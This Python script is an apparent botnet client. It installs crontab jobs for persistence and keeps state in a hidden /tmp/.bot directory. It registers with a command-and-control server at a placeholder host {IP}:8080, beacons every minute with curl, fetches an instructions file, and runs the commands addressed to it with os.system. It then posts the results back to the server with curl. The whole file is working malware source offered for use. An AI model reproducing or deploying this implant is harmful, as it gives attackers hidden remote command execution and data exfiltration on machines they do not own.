#!/usr/bin/env python3

import sys
import os
import requests
from datetime import datetime
import time

# Cronjob functions that set up bot to run 
# automatically each day and periodically beacon for instructions.
##whoami variable ensures that the program will always know where it is  
def cronjobs():
	whoami = os.getcwd()+"/charlex.py"
	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null 2>&1")| crontab -'
	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
	os.system(start)
	os.system(beacon)
	os.system(instructions)

#this creates hidden directory '.bot' in the working directory of the program.  
## in .bot, it creates a file called name.txt
def directoryhandler():
	dir = os.path.join('/tmp','.bot')
	if not os.path.exists(dir):
		os.mkdir(dir)
		os.chdir(dir)
		f = open('name.txt', 'w+')
		f.write('')
		f.close()

#namecheck reads the roster of bots and checks to see if it is listed.  
#if it is not listed, it names itself and sends its name to the server
def namecheck():
	dir = os.path.join('/tmp','.bot')
	os.chdir(dir)
	botnames = requests.get('http://{IP}:8080/botnames.txt')
	data = botnames.text.strip().split()
	lastbot = data[-1]
	with open('name.txt', 'r+') as f:
		if f.read() =='':
			myname = str(int(lastbot)+1)
			f.write(myname)
			request = 'curl -d '+myname+' http://{IP}:8080/botnames.txt'
			os.system(request)

#this is a beacon that runs as a cronjob 
#and sends the current time "Online" and the name of the bot
def beacon():
	rmyname = open('/tmp/.bot/name.txt', 'r')
	x = datetime.now()
	current_time = x.strftime("%H:%M:%S")
	data = current_time+' Online '+rmyname.read()
	request = 'curl -d "'+data+'" http://{IP}:8080/log.txt'
	os.system(request)

#this checks the instructions page on the server 
#and does the commands labeled with its name that it sees
def instructions():
	dir = '/tmp/.bot/'
	os.chdir(dir)
	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
	os.system("echo 'from_bot_number:' > sendthis.txt && cat name.txt >> sendthis.txt")
	os.system("cat names.txt >> sendthis.txt")
	os.system("echo ':' >> sendthis.txt")
	with open('response.txt') as input_file:
		myname = open('name.txt', 'r').read()
		for line in input_file:
			commands = line.split()
			mycommand = ''
			if commands[0] == myname or commands [0] == 'any':
				for thing in commands[1:]:
					mycommand += thing
					mycommand += ' '
				os.system(mycommand)
				os.system("echo '_NextTask_' >> sendthis.txt")
	os.system('curl --data-binary @./sendthis.txt http://{IP}:8080/instructions.txt')
	os.system('rm sendthis.txt response.txt')




if __name__ == '__main__':
	if len(sys.argv) == 1:
		cronjobs()
		directoryhandler()
		namecheck()
	elif sys.argv[1] == 'beacon':
		beacon()
	elif sys.argv[1] == 'instructions':
		instructions()
